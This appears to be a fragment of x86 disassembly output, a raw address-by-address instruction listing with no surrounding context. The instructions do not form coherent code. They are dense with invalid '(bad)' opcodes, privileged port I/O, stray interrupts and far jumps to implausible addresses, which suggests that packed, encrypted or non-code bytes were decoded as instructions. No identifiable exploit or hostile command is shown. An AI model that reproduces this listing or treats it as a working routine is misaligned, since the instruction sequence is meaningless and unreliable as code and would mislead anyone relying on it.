  40bebe:	mov    ebx,0x26ea4c10
  40bec3:	fwait
  40bec4:	stc    
  40bec5:	adc    DWORD PTR [esp+eax*2+0x4f8fb639],ecx
  40becc:	mov    dh,0x40
  40bece:	in     al,0x98
  40bed0:	lods   eax,DWORD PTR ds:[esi]
  40bed1:	mov    ss,ebp
  40bed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bed4:	in     al,0x6a
  40bed6:	cld    
  40bed7:	je     0x40be6b
  40bed9:	cmp    al,0x74
  40bedb:	adc    DWORD PTR [edi],eax
  40bedd:	add    bl,dl
  40bedf:	and    edx,DWORD PTR [edi-0x65c8df05]
  40bee5:	int    0xa5
  40bee7:	push   ss
  40bee8:	xchg   ah,dl
  40beea:	cmp    esp,DWORD PTR [edx+0x4f731325]
  40bef0:	cdq    
  40bef1:	dec    ebp
  40bef2:	in     al,dx
  40bef3:	shl    DWORD PTR [esi+0x4ff29460],cl
  40bef9:	cmp    eax,esi
  40befb:	gs mov bl,0xd2
  40befe:	mov    BYTE PTR [edx-0x43],dh
  40bf01:	jae    0x40bf76
  40bf03:	es (bad) 
  40bf05:	idiv   BYTE PTR [edi]
  40bf07:	data16 out dx,al
  40bf09:	jle    0x40bf77
  40bf0b:	lock jnp 0x40bf0c
  40bf0e:	dec    ebp
  40bf0f:	mov    bh,0x31
  40bf11:	cmc    
  40bf12:	in     al,0xe8
  40bf14:	jecxz  0x40bee0
  40bf16:	dec    ebx
  40bf17:	(bad)  
  40bf18:	fs ret 
  40bf1a:	pop    esi
  40bf1b:	(bad)  
  40bf1c:	mov    esp,0x26fb9386
  40bf21:	das    
  40bf22:	retf   
  40bf23:	test   DWORD PTR [esi-0x6f],eax
  40bf26:	cdq    
  40bf27:	icebp  
  40bf28:	jle    0x40bee8
  40bf2a:	icebp  
  40bf2b:	jg     0x40bfa0
  40bf2d:	repnz adc bh,BYTE PTR ds:[esi+0x75e74c6]
  40bf35:	mov    ecx,0xd63f1487
  40bf3a:	in     al,dx
  40bf3b:	adc    ch,0xb9
  40bf3e:	or     DWORD PTR [esi+0x66],ecx
  40bf41:	dec    edi
  40bf42:	mov    dl,BYTE PTR [edx]
  40bf44:	or     DWORD PTR [esi+0x4199cb37],esi
  40bf4a:	fld    QWORD PTR ds:[ebx+edx*4]
  40bf4e:	clc    
  40bf4f:	dec    eax
  40bf50:	inc    esp
  40bf51:	retf   
  40bf52:	mov    BYTE PTR [esi-0x5c],0xa7
  40bf56:	cmp    BYTE PTR [esp+eax*2],ch
  40bf59:	pop    ebx
  40bf5a:	cmp    DWORD PTR [esi],edi
  40bf5c:	shl    BYTE PTR [edi],0x25
  40bf5f:	push   edx
  40bf60:	fidiv  WORD PTR [edx+0x4e]
  40bf63:	leave  
  40bf64:	or     al,0x2e
  40bf66:	fmulp  st(4),st
  40bf68:	dec    edx
  40bf69:	xchg   edx,eax
  40bf6a:	int    0x3a
  40bf6c:	push   0x1d
  40bf6e:	pop    edi
  40bf6f:	cmp    DWORD PTR [eax+0x17],ecx
  40bf72:	retf   0x6681
  40bf75:	jb     0x40bf28
  40bf77:	pushf  
  40bf78:	adc    BYTE PTR ds:0x9a73127f,cl
  40bf7e:	mov    eax,ds:0xdee16c0d
  40bf83:	inc    eax
  40bf84:	xchg   esp,eax
  40bf85:	mov    al,ds:0xfd562317
  40bf8a:	xchg   BYTE PTR [esi-0x57],dl
  40bf8d:	add    eax,DWORD PTR ds:0xbb149d06
  40bf93:	in     eax,dx
  40bf94:	mov    eax,ds:0xc2cc8485
  40bf99:	into   
  40bf9a:	not    DWORD PTR [edx]
  40bf9c:	pop    ebx
  40bf9d:	mov    dl,0x16
  40bf9f:	dec    ebx
  40bfa0:	es (bad) 
  40bfa2:	scas   al,BYTE PTR es:[edi]
  40bfa3:	scas   al,BYTE PTR es:[edi]
  40bfa4:	push   esp
  40bfa5:	hlt    
  40bfa6:	bound  ecx,QWORD PTR [ebx+0xc6ec5a8]
  40bfac:	cmp    BYTE PTR [eax],cl
  40bfae:	ss dec edx
  40bfb0:	push   ebp
  40bfb1:	aas    
  40bfb2:	cmp    DWORD PTR [ebp+0x66],0x4
  40bfb6:	std    
  40bfb7:	xchg   ebp,eax
  40bfb8:	dec    ecx
  40bfb9:	test   eax,0x14879aca
  40bfbe:	aam    0x59
  40bfc0:	jge    0x40bfe2
  40bfc2:	ds dec edi
  40bfc4:	retf   
  40bfc5:	inc    ebp
  40bfc6:	add    eax,DWORD PTR [edx-0x57d4bb56]
  40bfcc:	cmp    DWORD PTR es:[ebp-0x6ab9b36e],ecx
  40bfd3:	or     al,BYTE PTR [ecx+edx*8-0x5]
  40bfd7:	pusha  
  40bfd8:	inc    eax
  40bfd9:	xor    dl,BYTE PTR [ecx+0x65]
  40bfdc:	mov    edx,0x52895bb6
  40bfe1:	and    DWORD PTR [esp],0x11
  40bfe5:	nop
  40bfe6:	aaa    
  40bfe7:	sahf   
  40bfe8:	cmp    DWORD PTR [ebp-0x42],esi
  40bfeb:	lds    ebx,FWORD PTR [edx+0x3c]
  40bfee:	popf   
  40bfef:	mov    edi,0x3336cede
  40bff4:	mov    dl,BYTE PTR [esi]
  40bff6:	mov    cl,0x29
  40bff8:	add    eax,0x965483c
  40bffd:	dec    edx
  40bffe:	aad    0x3f
  40c000:	je     0x40c00f
  40c002:	es jmp 0xfb5443f6
  40c008:	iret   
  40c009:	dec    esp
  40c00a:	(bad)  
  40c00b:	sub    esi,DWORD PTR [esi+0x3d1730c2]
  40c011:	lods   eax,DWORD PTR ds:[esi]
  40c012:	fs imul al
  40c015:	jmp    FWORD PTR [edx-0x77]
  40c018:	cmp    DWORD PTR [eax+0x3056ccb5],0xffffff86
  40c01f:	push   ebx
  40c020:	pop    eax
  40c021:	loopne 0x40bfac
  40c023:	sbb    BYTE PTR [edx+0x6dd4675f],0x37
  40c02a:	sbb    al,0x2f
  40c02c:	fwait
  40c02d:	jns    0x40bfe7
  40c02f:	add    ebp,DWORD PTR [ecx+0x7ffd7798]
  40c035:	int3   
  40c036:	cs mov ah,0x95
  40c039:	sbb    dl,BYTE PTR [edi-0x326e367e]
  40c03f:	in     eax,dx
  40c040:	ins    DWORD PTR es:[edi],dx
  40c041:	imul   ecx
  40c043:	cmp    BYTE PTR [eax-0x7039ea94],0xa9
  40c04a:	xor    ah,dl
  40c04c:	sbb    eax,0xa40372f2
  40c051:	sub    ebx,DWORD PTR [edi+0x55e12f08]
  40c057:	pop    es
  40c058:	outs   dx,DWORD PTR ds:[esi]
  40c059:	adc    BYTE PTR [edi+0x28],ah
  40c05c:	test   al,0x52
  40c05e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c05f:	push   es
  40c060:	jmp    0x1628:0x119d1b41
  40c067:	xor    al,0xe9
  40c069:	inc    ebx
  40c06a:	aam    0x76
  40c06c:	cld    
  40c06d:	inc    ecx
  40c06e:	loope  0x40c066
  40c070:	jns    0x40c02d
  40c072:	or     BYTE PTR [esi+0x16],ah
  40c075:	xchg   al,ah
  40c077:	xchg   ebp,eax
  40c078:	or     DWORD PTR [ebx-0x371b1964],esi
  40c07e:	xchg   edi,eax
  40c07f:	and    edx,DWORD PTR [eax+0x7c0f6372]
  40c085:	retf   0x2430
  40c088:	ds es dec edx
  40c08b:	(bad)  
  40c08c:	arpl   WORD PTR [eax],di
  40c08e:	mov    esp,0x55e50844
  40c093:	inc    ebx
  40c094:	pushf  
  40c095:	popf   
  40c096:	mov    ebx,0xd9018a5a
  40c09b:	fsubr  DWORD PTR [edi-0x47]
  40c09e:	out    0x4a,al
  40c0a0:	(bad)  
  40c0a1:	mov    al,0x61
  40c0a3:	enter  0x487a,0x33
  40c0a7:	xchg   edx,eax
  40c0a8:	mov    eax,ds:0xc1f7e419
  40c0ad:	jle    0x40c03a
  40c0af:	mov    bh,0x0
  40c0b1:	bound  ebp,QWORD PTR [edi]
  40c0b3:	or     edi,ecx
  40c0b5:	addr16 ja 0x40c077
  40c0b8:	lahf   
  40c0b9:	dec    edx
  40c0ba:	popa   
  40c0bb:	iret   
  40c0bc:	inc    eax
  40c0bd:	mov    eax,ds:0xfab8c5d9
  40c0c2:	jo     0x40c113
  40c0c4:	in     al,0x2b
  40c0c6:	ret    
  40c0c7:	sbb    al,0x25
  40c0c9:	out    dx,eax
  40c0ca:	mov    eax,ds:0x839cd272
  40c0cf:	push   ebp
  40c0d0:	xchg   DWORD PTR [eax+ebp*1-0x4c],edx
  40c0d4:	jno    0x40c06a
  40c0d6:	mov    ds:0x58e57c8c,al
  40c0db:	daa    
  40c0dc:	std    
  40c0dd:	inc    esi
  40c0de:	mov    eax,0xaa2aac4
  40c0e3:	pusha  
  40c0e4:	and    bh,BYTE PTR [edx+edi*4]
  40c0e7:	adc    BYTE PTR [esi],bl
  40c0e9:	xchg   BYTE PTR [esi-0x1df8d1a0],cl
  40c0ef:	mov    bl,0xf3
  40c0f1:	xlat   BYTE PTR ds:[ebx]
  40c0f2:	(bad)  
  40c0f3:	xor    edx,DWORD PTR [ebp-0x15]
  40c0f6:	inc    ebx
  40c0f7:	xchg   ebp,eax
  40c0f8:	inc    esp
  40c0f9:	loopne 0x40c157
  40c0fb:	mov    ch,0x5f
  40c0fd:	push   ds
  40c0fe:	sahf   
  40c0ff:	mov    ds:0x6194b836,eax
  40c104:	ret    0xaef8
  40c107:	push   edx
  40c108:	mov    dh,0xd9
  40c10a:	arpl   WORD PTR [ebx+0xa],sp
  40c10d:	cmp    esp,ebx
  40c10f:	dec    esi
  40c110:	rcl    DWORD PTR ds:[eax-0x7eadba46],1
  40c117:	jns    0x40c127
  40c119:	dec    edx
  40c11a:	jno    0x40c0d5
  40c11c:	sub    ah,dl
  40c11e:	push   ss
  40c11f:	jmp    ecx
  40c121:	popf   
  40c122:	jmp    0x3ca:0x76031d86
  40c129:	ja     0x40c0fc
  40c12b:	push   ds
  40c12c:	arpl   WORD PTR [edi+ecx*4-0x44],ax
  40c130:	jp     0x40c128
  40c132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c133:	xchg   ah,al
  40c135:	mov    ebp,eax
  40c137:	mov    ebx,DWORD PTR [ecx+0x7d]
  40c13a:	int3   
  40c13b:	pop    ebx
  40c13c:	test   dl,ah
  40c13e:	pop    edi
  40c13f:	call   0x8195:0x1b53228a
  40c146:	sub    edi,ebp
  40c148:	jnp    0x40c0e0
  40c14a:	cmp    esi,DWORD PTR [ebp+0x64]
  40c14d:	inc    edx
  40c14e:	mov    ah,0xcb
  40c150:	sub    al,0xa
  40c152:	jae    0x40c18e
  40c154:	sub    DWORD PTR [eax-0x10],0x6e0dd921
  40c15b:	loop   0x40c139
  40c15d:	popf   
  40c15e:	imul   edx,DWORD PTR [edi+0x5921ed73],0xfffffffc
  40c165:	add    edx,ebx
  40c167:	sbb    eax,0x7d96ffac
  40c16c:	inc    edi
  40c16d:	push   edx
  40c16e:	test   DWORD PTR [esi],0xcaa6495f
  40c174:	xor    al,bh
  40c176:	lock xor ecx,ecx
  40c179:	add    al,bh
  40c17b:	pushf  
  40c17c:	rcr    BYTE PTR [ebx+ecx*8],1
  40c17f:	jmp    0xb7c2af7d
  40c184:	clc    
  40c185:	add    al,0x56
  40c187:	enter  0x1429,0xc
  40c18b:	rcr    ebx,0xe4
  40c18e:	pusha  
  40c18f:	push   0xf
  40c191:	mov    bl,0x49
  40c193:	xchg   esi,eax
  40c194:	daa    
  40c195:	fbstp  TBYTE PTR [edx]
  40c197:	pop    DWORD PTR [ecx+0x65]
  40c19a:	jno    0x40c1f5
  40c19c:	mov    ebx,0xb4cc07b
  40c1a1:	sbb    eax,0x7047ca7d
  40c1a6:	xor    BYTE PTR [eax-0x43e783da],ch
  40c1ac:	xchg   esi,eax
  40c1ad:	rcl    BYTE PTR [ebp-0x7f],0x4
  40c1b1:	mov    ebx,0xd1d1d06a
  40c1b6:	jg     0x40c1f9
  40c1b8:	and    al,0xb3
  40c1ba:	sbb    DWORD PTR [eax-0x60],0x4
  40c1be:	and    BYTE PTR gs:[eax],dl
  40c1c1:	call   FWORD PTR [ebp-0x52]
  40c1c4:	adc    bh,BYTE PTR [esi]
  40c1c6:	div    BYTE PTR ss:[esi-0x3]
  40c1ca:	push   esi
  40c1cb:	loopne 0x40c1d4
  40c1cd:	push   ebx
  40c1ce:	mov    DWORD PTR ds:0x5cf56182,eax
  40c1d4:	push   es
  40c1d5:	int    0x83
  40c1d7:	aaa    
  40c1d8:	push   esp
  40c1d9:	rol    edi,0xa8
  40c1dc:	add    eax,0xfcd1a117
  40c1e1:	stos   BYTE PTR es:[edi],al
  40c1e2:	aaa    
  40c1e3:	out    0x6e,eax
  40c1e5:	jb     0x40c19f
  40c1e7:	cmp    esp,DWORD PTR [ebx]
  40c1e9:	repnz fnstsw WORD PTR [ebp-0x7127961c]
  40c1f0:	aad    0xdb
  40c1f2:	push   ebp
  40c1f3:	adc    cl,dl
  40c1f5:	sbb    BYTE PTR [edi+0x67],dl
  40c1f8:	push   ebx
  40c1f9:	cdq    
  40c1fa:	pusha  
  40c1fb:	jae    0x40c1a3
  40c1fd:	mov    ebp,0xd847ca45
  40c202:	test   cl,ah
  40c204:	mov    DWORD PTR [edx-0x73dfbfab],edx
  40c20a:	xchg   edx,eax
  40c20b:	xchg   bl,bh
  40c20d:	sub    edx,0x701ce909
  40c213:	jle    0x40c254
  40c215:	xchg   esi,eax
  40c216:	mov    BYTE PTR [esp+ebx*4-0x2988c65e],dh
  40c21d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c21e:	lea    edi,[ebp+0x4871e5a6]
  40c224:	xchg   edi,eax
  40c225:	pop    ecx
  40c226:	mov    ds:0x778cee39,eax
  40c22b:	rol    BYTE PTR [ecx-0xe],1
  40c22e:	popa   
  40c22f:	data16 div bl
  40c232:	out    dx,eax
  40c233:	cmp    DWORD PTR ds:0x3dbc6363,edi
  40c239:	mov    ds:0xe58c53bd,al
  40c23e:	inc    edi
  40c23f:	jns    0x40c1c1
  40c241:	sub    ebx,ebx
  40c243:	loopne 0x40c246
  40c245:	or     dh,BYTE PTR [ebp+0x521a3195]
  40c24b:	out    dx,eax
  40c24c:	mov    eax,ds:0xdae26899
  40c251:	and    DWORD PTR [ebx-0x16e7d37a],edx
  40c257:	sbb    DWORD PTR [esi-0x7],esi
  40c25a:	mov    bl,0x81
  40c25c:	loop   0x40c1fa
  40c25e:	pop    eax
  40c25f:	push   eax
  40c260:	jmp    0xb3c0:0x24880ae5
  40c267:	sbb    edi,eax
  40c269:	and    al,0xda
  40c26b:	pop    ebp
  40c26c:	sub    eax,0x7b8f44da
  40c271:	jae    0x40c265
  40c273:	xchg   BYTE PTR [esi+0x8],bl
  40c276:	mov    dl,0xa8
  40c278:	mov    edx,ebx
  40c27a:	pusha  
  40c27b:	sbb    dl,BYTE PTR [edi+0x7c31e94f]
  40c281:	stos   DWORD PTR es:[edi],eax
  40c282:	das    
  40c283:	cmp    eax,0xa125b520
  40c288:	push   ebp
  40c289:	hlt    
  40c28a:	cdq    
  40c28b:	dec    esp
  40c28c:	popa   
  40c28d:	push   cs
  40c28e:	xor    eax,0xf812ef67
  40c293:	xchg   edx,eax
  40c294:	mov    ebx,0x5103ebad
  40c299:	mov    al,ds:0x42f92df
  40c29e:	jns    0x40c23b
  40c2a0:	adc    dl,BYTE PTR [ebx]
  40c2a2:	xor    BYTE PTR [edi+0x77b40529],dl
  40c2a8:	aad    0x2d
  40c2aa:	mov    dl,0xfd
  40c2ac:	outs   dx,BYTE PTR ds:[esi]
  40c2ad:	icebp  
  40c2ae:	and    al,0xf7
  40c2b0:	dec    eax
  40c2b1:	cld    
  40c2b2:	(bad)  
  40c2b3:	jmp    0x40c313
  40c2b5:	nop
  40c2b6:	es dec ebx
  40c2b8:	sub    DWORD PTR [ecx+0x34],ebp
  40c2bb:	cmp    eax,0xa964fa2
  40c2c0:	popa   
  40c2c1:	das    
  40c2c2:	adc    dl,dh
  40c2c4:	icebp  
  40c2c5:	mov    esi,esi
  40c2c7:	out    dx,eax
  40c2c8:	test   dl,bh
  40c2ca:	mov    al,0x5b
  40c2cc:	int    0xd0
  40c2ce:	leave  
  40c2cf:	push   cs
  40c2d0:	xchg   esi,eax
  40c2d1:	test   al,0x8f
  40c2d3:	push   ebp
  40c2d4:	and    eax,0xd1bd6f9
  40c2d9:	int3   
  40c2da:	xor    eax,0x7574c3e0
  40c2df:	cs jmp 0x40c35b
  40c2e2:	scas   al,BYTE PTR es:[edi]
  40c2e3:	aad    0xc5
  40c2e5:	push   0x63
  40c2e7:	mov    esi,0x46ce5562
  40c2ec:	outs   dx,BYTE PTR ds:[esi]
  40c2ed:	mov    bh,0xa6
  40c2ef:	jno    0x40c2ae
  40c2f1:	(bad)  
  40c2f2:	fidivr DWORD PTR [esp+edi*1-0x43]
  40c2f6:	sub    al,0xc8
  40c2f8:	mov    al,ds:0x8fa07139
  40c2fd:	scas   al,BYTE PTR es:[edi]
  40c2fe:	imul   edi,DWORD PTR [eax+eiz*1-0x1a],0x18
  40c303:	dec    DWORD PTR [edi+0xf280b7b]
  40c309:	mov    ebx,0x4615d409
  40c30e:	sbb    eax,0xf487172e
  40c313:	scas   al,BYTE PTR es:[edi]
  40c314:	jge    0x40c328
  40c316:	cmp    eax,0xc7c49341
  40c31b:	int3   
  40c31c:	gs inc eax
  40c31e:	pop    es
  40c31f:	dec    edi
  40c320:	sub    al,0x12
  40c322:	int    0x79
  40c324:	push   0xb5c3168
  40c329:	inc    edi
  40c32a:	ds sbb al,0x2
  40c32d:	stos   BYTE PTR es:[edi],al
  40c32e:	(bad)  
  40c32f:	mov    ebp,0x7826c8f1
  40c334:	ret    
  40c335:	mov    edi,DWORD PTR [eax+0x6d3270be]
  40c33b:	or     ah,dl
  40c33d:	dec    ecx
  40c33e:	push   edx
  40c33f:	or     al,0x1e
  40c341:	push   esi
  40c342:	jno    0x40c38e
  40c344:	fwait
  40c345:	int3   
  40c346:	cmp    ch,BYTE PTR [edi+0x55f01809]
  40c34c:	mov    eax,ds:0x9f680cc2
  40c351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c352:	shl    esi,cl
  40c354:	mov    ah,0xf7
  40c356:	aaa    
  40c357:	in     al,dx
  40c358:	mov    fs,WORD PTR ds:0xa492da98
  40c35e:	and    al,0x40
  40c360:	push   0xe
  40c362:	mov    eax,ds:0xdd51e77a
  40c367:	xor    edi,DWORD PTR ds:0x279f8f4a
  40c36d:	movntps XMMWORD PTR [edi+0x53],xmm0
  40c371:	in     al,0x9c
  40c373:	jecxz  0x40c318
  40c375:	push   esp
  40c376:	mov    al,BYTE PTR [ebp+ecx*4+0x38]
  40c37a:	inc    ebp
  40c37b:	jo     0x40c353
  40c37d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c37e:	ins    BYTE PTR es:[edi],dx
  40c37f:	mov    eax,0x28cb48a1
  40c384:	hlt    
  40c385:	push   cs
  40c386:	push   eax
  40c387:	(bad)  
  40c388:	sub    eax,0x3342d09e
  40c38d:	inc    eax
  40c38e:	lds    eax,FWORD PTR [edi+0x2b6ac6f7]
  40c394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c395:	mov    DWORD PTR [ebx],esi
  40c397:	push   0xffffffdb
  40c399:	shl    edx,cl
  40c39b:	push   ds
  40c39c:	jmp    0xe554:0x26caf418
  40c3a3:	ja     0x40c328
  40c3a5:	gs mov eax,0x7a2c4e80
  40c3ab:	push   es
  40c3ac:	nop
  40c3ad:	mov    dl,BYTE PTR [ecx-0x2d48b251]
  40c3b3:	xchg   esi,eax
  40c3b4:	add    ecx,DWORD PTR [esi+0x77]
  40c3b7:	inc    eax
  40c3b8:	popf   
  40c3b9:	fnstenv [edx]
  40c3bb:	pop    ebp
  40c3bc:	ret    0xb69d
  40c3bf:	inc    edx
  40c3c0:	arpl   WORD PTR [ebx],dx
  40c3c2:	cmp    DWORD PTR [esi+ecx*1+0x66],0xf65a5f81
  40c3ca:	and    DWORD PTR [esi+0x69],edx
  40c3cd:	(bad)  
  40c3ce:	cmp    ebx,DWORD PTR [eax-0x4c]
  40c3d1:	inc    ebx
  40c3d2:	out    0x8e,eax
  40c3d4:	mov    edi,DWORD PTR [ecx]
  40c3d6:	out    0xa,eax
  40c3d8:	pop    esi
  40c3d9:	jbe    0x40c363
  40c3db:	pop    ebp
  40c3dc:	mov    dl,0x11
  40c3de:	push   esp
  40c3df:	xor    edx,0xc096d9c0
  40c3e5:	mov    dl,dh
  40c3e7:	xchg   ebp,eax
  40c3e8:	das    
  40c3e9:	lods   al,BYTE PTR ds:[esi]
  40c3ea:	test   DWORD PTR [ecx],ebx
  40c3ec:	cmp    eax,DWORD PTR [ebp+edx*2+0x26]
  40c3f0:	and    bh,BYTE PTR [edx]
  40c3f2:	fisttp DWORD PTR [ecx+ebx*2+0x59]
  40c3f6:	mov    esp,0xc00dc133
  40c3fb:	mov    esp,0xfbc273b5
  40c400:	mov    ecx,edx
  40c402:	sar    DWORD PTR [ebp+0x3e],cl
  40c405:	test   eax,0x5b1f9639
  40c40a:	cmp    al,0x85
  40c40c:	sub    esi,DWORD PTR [esi]
  40c40e:	xchg   edi,eax
  40c40f:	fucomp st(0)
  40c411:	mov    ds:0x1df94a4e,eax
  40c416:	mov    eax,0xf0f608c9
  40c41b:	xor    ch,ah
  40c41d:	push   ds
  40c41e:	(bad)  
  40c420:	dec    esp
  40c421:	fs retf 0x889
  40c425:	pop    ebx
  40c426:	fs dec edx
  40c428:	fstp   TBYTE PTR [edx-0x5b8a1fdf]
  40c42e:	fldcw  WORD PTR [esi+0x608ab446]
  40c434:	inc    edi
  40c435:	iret   
  40c436:	es mov edx,0x668c7625
  40c43c:	js     0x40c43d
  40c43e:	and    eax,0xd6fa112a
  40c443:	xchg   ecx,eax
  40c444:	push   0xfffffffc
  40c446:	add    DWORD PTR [ebp+0x5f63fb44],0x150e2ed7
  40c450:	dec    ebp
  40c451:	add    eax,0x214af102
  40c456:	fsubr  QWORD PTR [ebx]
  40c458:	out    dx,al
  40c459:	(bad)  
  40c45a:	push   es
  40c45b:	pop    ecx
  40c45c:	inc    esp
  40c45d:	sbb    DWORD PTR [esi-0x71],edi
  40c460:	sub    BYTE PTR [edi-0x74],0x5f
  40c464:	sub    bl,dh
  40c466:	xchg   ebx,eax
  40c467:	cmp    ecx,DWORD PTR [esi]
  40c469:	mov    edi,0xf406e4ab
  40c46e:	add    DWORD PTR [ebx-0x54],edi
  40c471:	adc    BYTE PTR ds:0x76f6871f,0x3a
  40c478:	inc    ebx
  40c479:	xchg   esi,eax
  40c47a:	cwde   
  40c47b:	push   edi
  40c47c:	test   DWORD PTR [ebx+0x32a17585],0xc84efcc5
  40c486:	cdq    
  40c487:	cmp    al,0x4f
  40c489:	sar    BYTE PTR [ecx-0x562741b6],0x75
  40c490:	xor    eax,0x2539863b
  40c495:	dec    ebx
  40c496:	in     al,0x60
  40c498:	(bad)  
  40c499:	ror    DWORD PTR [edx-0x161eb140],1
  40c49f:	mov    ch,0x3f
  40c4a1:	xchg   edx,eax
  40c4a2:	mov    al,0x5
  40c4a4:	cmp    eax,DWORD PTR [ecx-0x154563f7]
  40c4aa:	fisubr DWORD PTR [eax-0x4649234]
  40c4b0:	shl    BYTE PTR ds:0xffe5a114,cl
  40c4b6:	pop    esp
  40c4b7:	xor    BYTE PTR [ebp+0xbb8b2e3],ch
  40c4bd:	dec    edi
  40c4be:	and    DWORD PTR [edi+0x5f],0xf
  40c4c2:	repz test DWORD PTR [ebp+0x1f],esp
  40c4c6:	cmp    al,0x36
  40c4c8:	aas    
  40c4c9:	jo     0x40c549
  40c4cb:	int3   
  40c4cc:	fcmove st,st(3)
  40c4ce:	sahf   
  40c4cf:	xchg   edi,eax
  40c4d0:	stos   BYTE PTR es:[edi],al
  40c4d1:	sbb    BYTE PTR [eax+0xefa4928],0xbe
  40c4d8:	jge    0x40c488
  40c4da:	or     BYTE PTR [eax],cl
  40c4dc:	sub    al,0x20
  40c4de:	aam    0xb0
  40c4e0:	es stc 
  40c4e2:	xor    edx,DWORD PTR [edi-0x2c]
  40c4e5:	push   edi
  40c4e6:	push   eax
  40c4e7:	xchg   ebp,eax
  40c4e8:	jge    0x40c55f
  40c4ea:	mov    ebp,0x91bdf8f2
  40c4ef:	test   BYTE PTR [edi-0x203ca5f9],ch
  40c4f5:	outs   dx,BYTE PTR ds:[esi]
  40c4f6:	in     eax,dx
  40c4f7:	mov    eax,ds:0x5b28c006
  40c4fc:	adc    ah,BYTE PTR [edx+eiz*8-0x53cc183a]
  40c503:	imul   ebp,DWORD PTR [ebx+0x5d298dd4],0x44
  40c50a:	mov    ecx,0xefc25292
  40c50f:	and    al,0xd9
  40c511:	(bad)  
  40c512:	iret   
  40c513:	jb     0x40c50f
  40c515:	cmp    dh,BYTE PTR [ecx]
  40c517:	in     al,0xbf
  40c519:	jle    0x40c54a
  40c51b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c51c:	rcr    DWORD PTR [edi],cl
  40c51e:	mov    al,0x5c
  40c520:	push   es
  40c521:	jbe    0x40c4d3
  40c523:	mov    cl,0x89
  40c525:	popa   
  40c526:	adc    bh,BYTE PTR [esp+ebx*4-0x72]
  40c52a:	test   DWORD PTR [edx],ebp
  40c52c:	mov    ch,0xf4
  40c52e:	xor    BYTE PTR [ebp-0x2cfb298f],bl
  40c534:	mov    bl,0x63
  40c536:	push   0xffffffdd
  40c538:	lods   eax,DWORD PTR ds:[esi]
  40c539:	mov    BYTE PTR [edx-0x4f],ah
  40c53c:	test   BYTE PTR [edx],bl
  40c53e:	mov    fs,ecx
  40c540:	mov    DWORD PTR [ebx],ecx
  40c542:	pop    edx
  40c543:	(bad)  
  40c544:	fisubr WORD PTR [esi]
  40c546:	cmp    edx,esi
  40c548:	out    0x94,al
  40c54a:	fld    TBYTE PTR [ebx+0x68]
  40c54d:	cmp    ch,BYTE PTR [edx-0xa]
  40c550:	pop    es
  40c551:	data16 jge 0x40c4ef
  40c554:	mov    ebp,0x467547ca
  40c559:	jnp    0x40c535
  40c55b:	or     eax,0x4c54a5ee
  40c560:	ins    DWORD PTR es:[edi],dx
  40c561:	out    dx,al
  40c562:	cmp    al,BYTE PTR [eax-0x3]
  40c565:	and    BYTE PTR [ecx-0x35],dh
  40c568:	push   ds
  40c569:	or     BYTE PTR [esi-0x6158ebd8],ah
  40c56f:	mov    esp,0xbd0354d3
  40c574:	jmp    0x40c581
  40c576:	inc    edx
  40c577:	das    
  40c578:	cdq    
  40c579:	push   edi
  40c57a:	adc    ebp,edx
  40c57c:	ins    DWORD PTR es:[edi],dx
  40c57d:	jne    0x40c5c4
  40c57f:	fisubr WORD PTR [eax-0x4cb26c4d]
  40c585:	jmp    0x40c5f3
  40c587:	pushf  
  40c588:	ins    DWORD PTR es:[edi],dx
  40c589:	std    
  40c58a:	push   ebx
  40c58b:	push   esi
  40c58c:	jnp    0x40c5fb
  40c58e:	paddsb mm1,QWORD PTR [edx+0x66adfc00]
  40c595:	mov    dl,0x28
  40c597:	xchg   edx,eax
  40c598:	mov    esp,0xc3e6dbd4
  40c59d:	gs xor eax,0xc209e75b
  40c5a3:	sbb    al,0xf7
  40c5a5:	packsswb mm0,QWORD PTR [edi*8-0x46afd041]
  40c5ad:	xchg   ebx,eax
  40c5ae:	pop    ecx
  40c5af:	jl     0x40c5ca
  40c5b1:	stc    
  40c5b2:	lods   eax,DWORD PTR ds:[esi]
  40c5b3:	fwait
  40c5b4:	div    edx
  40c5b6:	or     eax,0x51d9961a
  40c5bb:	inc    edx
  40c5bc:	xor    DWORD PTR [ecx+0x2a],esi
  40c5bf:	adc    eax,DWORD PTR [ebx]
  40c5c1:	loop   0x40c5bd
  40c5c3:	imul   eax,ecx,0xd9a2624a
  40c5c9:	mov    al,0x12
  40c5cb:	test   cl,ch
  40c5cd:	jl     0x40c577
  40c5cf:	ins    DWORD PTR es:[edi],dx
  40c5d0:	or     edx,ecx
  40c5d2:	sub    ebx,DWORD PTR [edi]
  40c5d4:	and    DWORD PTR [eax+ebx*4+0x79],ebp
  40c5d8:	and    esp,DWORD PTR [edx+eiz*4]
  40c5db:	aam    0xd2
  40c5dd:	rcr    BYTE PTR [ebx],1
  40c5df:	xchg   edi,eax
  40c5e0:	(bad)  
  40c5e1:	inc    DWORD PTR [edx]
  40c5e3:	in     al,0x8f
  40c5e5:	cmp    BYTE PTR [ecx+edx*4-0x43],cl
  40c5e9:	push   esi
  40c5ea:	dec    esi
  40c5eb:	faddp  st(0),st
  40c5ed:	jge    0x40c57a
  40c5ef:	and    BYTE PTR [edi+ecx*8-0x4a],ch
  40c5f3:	loop   0x40c631
  40c5f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5f6:	inc    ebp
  40c5f7:	cmp    bl,BYTE PTR [edx]
  40c5f9:	je     0x40c58d
  40c5fb:	xlat   BYTE PTR ds:[ebx]
  40c5fc:	lock mov ds:0xfa39364a,al
  40c602:	lahf   
  40c603:	xchg   ebp,eax
  40c604:	pop    ebp
  40c605:	or     bl,BYTE PTR [ebx+0xd27d8f9]
  40c60b:	and    al,0xfd
  40c60d:	jnp    0x40c652
  40c60f:	dec    edi
  40c610:	(bad)  
  40c611:	inc    ebp
  40c612:	loope  0x40c5cb
  40c614:	lock fiadd WORD PTR [ebp+esi*4+0x33]
  40c619:	shl    BYTE PTR [ebx+ebx*2],1
  40c61c:	mov    eax,ds:0x6d399b56
  40c621:	push   ds
  40c622:	cmp    dl,BYTE PTR [ecx+0x3e8f7d14]
  40c628:	xlat   BYTE PTR ds:[ebx]
  40c629:	push   cs
